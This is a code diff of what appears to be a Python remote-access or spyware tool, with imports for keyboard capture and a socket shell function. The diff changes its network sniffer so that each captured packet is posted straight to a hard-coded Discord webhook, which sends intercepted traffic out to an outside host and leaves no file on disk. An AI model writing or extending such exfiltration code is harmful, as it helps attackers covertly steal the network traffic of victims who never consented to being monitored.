@@ -6,9 +6,9 @@ import scapy.all as scapy
 import threading
 import requests
 import subprocess
-import os
 import keyboard  # Import the keyboard library
 import psutil  # To list and identify network interfaces
+import io  # For in-memory byte streams
 
 # Function to get the default network interface
 def get_default_interface():
@@ -63,34 +63,25 @@ def sniffer_start():
             return
         sniffer_running = True
 
-    pcap_file = 'target.cap'
-
-    def sniff_and_save(pkt):
-        scapy.wrpcap(pcap_file, pkt, append=True)
+    def sniff_and_upload(pkt):
+        # Instead of saving to file, we store the packet in memory and upload
+        packet_bytes = bytes(pkt)
+        webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
+        
+        try:
+            # Upload the captured packet directly (could be done in batches or as individual packets)
+            response = requests.post(webhook_url, files={'file': ('packet.cap', io.BytesIO(packet_bytes))})
+            print(f"Packet uploaded: {response.status_code}")
+        except Exception as e:
+            print(f"Error uploading packet: {e}")
 
     try:
         print(f"Sniffing on interface: {INTERFACE}")
-        scapy.sniff(iface=INTERFACE, timeout=60, prn=sniff_and_save, store=True)
+        scapy.sniff(iface=INTERFACE, timeout=60, prn=sniff_and_upload, store=False)  # Avoid storing packets in memory
     except Exception as e:
         print(f"Sniffer error: {e}")
     finally:
         sniffer_running = False  # Reset flag after sniffing
-
-    if not os.path.exists(pcap_file):
-        print("Sniffing failed: No packets captured.")
-        return
-
-    webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
-    try:
-        with open(pcap_file, 'rb') as f:
-            response = requests.post(webhook_url, files={'file': f})
-        print("File uploaded:", response.status_code)
-
-        os.remove(pcap_file)
-        print("File deleted successfully.")
-
-    except Exception as e:
-        print("Upload failed:", str(e))
 
 def shell(client_socket):
     while True:
